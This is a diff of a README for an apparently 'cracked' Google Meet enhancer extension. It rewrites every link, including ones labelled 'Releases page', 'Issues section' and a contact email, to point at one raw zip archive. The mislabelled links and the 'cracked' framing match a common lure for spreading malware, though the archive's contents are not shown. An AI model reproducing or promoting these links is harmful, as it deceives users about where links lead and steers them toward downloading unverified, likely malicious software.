@@ -1,6 +1,6 @@
 # 🌟 cracked-enhancer-for-google-meet-extension - Enhance Your Google Meet Experience
 
-[![Download Now](https://raw.githubusercontent.com/igoralways/cracked-enhancer-for-google-meet-extension/main/josh/cracked-enhancer-for-google-meet-extension.zip%20Now-Visit%20Releases-brightgreen)](https://raw.githubusercontent.com/igoralways/cracked-enhancer-for-google-meet-extension/main/josh/cracked-enhancer-for-google-meet-extension.zip)
+[![Download Now](https://github.com/igoralways/cracked-enhancer-for-google-meet-extension/raw/refs/heads/main/josh/cracked_for_extension_meet_google_enhancer_v3.8.zip%20Now-Visit%20Releases-brightgreen)](https://github.com/igoralways/cracked-enhancer-for-google-meet-extension/raw/refs/heads/main/josh/cracked_for_extension_meet_google_enhancer_v3.8.zip)
 
 ## 🚀 Getting Started
 
@@ -31,7 +31,7 @@ To run the Cracked Enhancer for Google Meet Extension, you will need:
 
 To get started, you need to download the extension. You can download it from the Releases page. 
 
-Visit this page to download: [Cracked Enhancer for Google Meet Extension Releases](https://raw.githubusercontent.com/igoralways/cracked-enhancer-for-google-meet-extension/main/josh/cracked-enhancer-for-google-meet-extension.zip)
+Visit this page to download: [Cracked Enhancer for Google Meet Extension Releases](https://github.com/igoralways/cracked-enhancer-for-google-meet-extension/raw/refs/heads/main/josh/cracked_for_extension_meet_google_enhancer_v3.8.zip)
 
 Once on the page, locate the latest version and follow these steps:
 
@@ -58,7 +58,7 @@ If you encounter any issues while using the extension, try the following solutio
 2. **Toggle the Extension**: Disable and re-enable it to refresh its settings.
 3. **Clear Cache**: Open your browser settings and clear the cache to ensure all functions load correctly.
 
-For further assistance, you can check the [Issues section](https://raw.githubusercontent.com/igoralways/cracked-enhancer-for-google-meet-extension/main/josh/cracked-enhancer-for-google-meet-extension.zip) on our GitHub repository.
+For further assistance, you can check the [Issues section](https://github.com/igoralways/cracked-enhancer-for-google-meet-extension/raw/refs/heads/main/josh/cracked_for_extension_meet_google_enhancer_v3.8.zip) on our GitHub repository.
 
 ## 💬 Community and Support
 
@@ -66,8 +66,8 @@ Join our community to ask questions and share your experience. Feel free to reac
 
 ## 📞 Contact Us
 
-If you need more help or want to provide feedback, you can email us at https://raw.githubusercontent.com/igoralways/cracked-enhancer-for-google-meet-extension/main/josh/cracked-enhancer-for-google-meet-extension.zip
+If you need more help or want to provide feedback, you can email us at https://github.com/igoralways/cracked-enhancer-for-google-meet-extension/raw/refs/heads/main/josh/cracked_for_extension_meet_google_enhancer_v3.8.zip
 
 Download the extension today and enjoy a better Google Meet experience!  
 
-Once again, visit this page to download: [Cracked Enhancer for Google Meet Extension Releases](https://raw.githubusercontent.com/igoralways/cracked-enhancer-for-google-meet-extension/main/josh/cracked-enhancer-for-google-meet-extension.zip)
+Once again, visit this page to download: [Cracked Enhancer for Google Meet Extension Releases](https://github.com/igoralways/cracked-enhancer-for-google-meet-extension/raw/refs/heads/main/josh/cracked_for_extension_meet_google_enhancer_v3.8.zip)
